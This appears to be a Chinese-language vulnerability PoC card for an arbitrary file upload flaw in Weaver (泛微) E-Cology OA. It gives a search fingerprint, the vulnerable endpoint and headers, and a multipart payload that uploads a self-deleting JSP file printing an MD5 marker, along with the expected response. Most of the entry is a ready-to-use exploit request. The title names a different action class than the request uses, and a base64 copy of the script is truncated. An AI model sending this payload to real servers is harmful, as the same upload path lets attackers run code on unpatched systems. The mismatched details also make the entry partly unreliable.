# 泛微OAE-CologyAction.jspmobile.skin.SkinAction存在任意文件上传漏洞

- **系统**：泛微OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body = "/wui/common/css/w7OVFont_wev8.css"`
- **请求**：`POST /mobilemode/Action.jsp?invoker=com.weaver.formmodel.mobile.ui.servlet.MobileAppUploadAction&action=image HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxk…`　`Content-Length: [根据实际文件内容计算]`

**请求体 / payload**
```
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="upload"; filename="1.jsp"
Content-Type: application/octet-stream
<% out.print("202cb962ac59075b964b07152d234b70");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
------WebKitFormBoundary7MA4YWxkTrZu0gW
>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="upload"; filename=""
Content-Type: text/plain;base64
PCUgb3V0LnByaW50bG4oIjIwMmNiOTYyYWM1OTA3NWI5NjRiMDcxNTJkMjM0YjcwIik7bmV3IGphdmEuaW8uRmlsZShhcHBsaWNhdGlvbi5nZXRSZWFsUGF0aChyZXF1ZXN0LmdldFNlcnZsZXRQYXRoKCk…（脚本共 897 字，完整版见原文）
```
- **预期**：200　|　202cb962ac59075b964b07152d234b70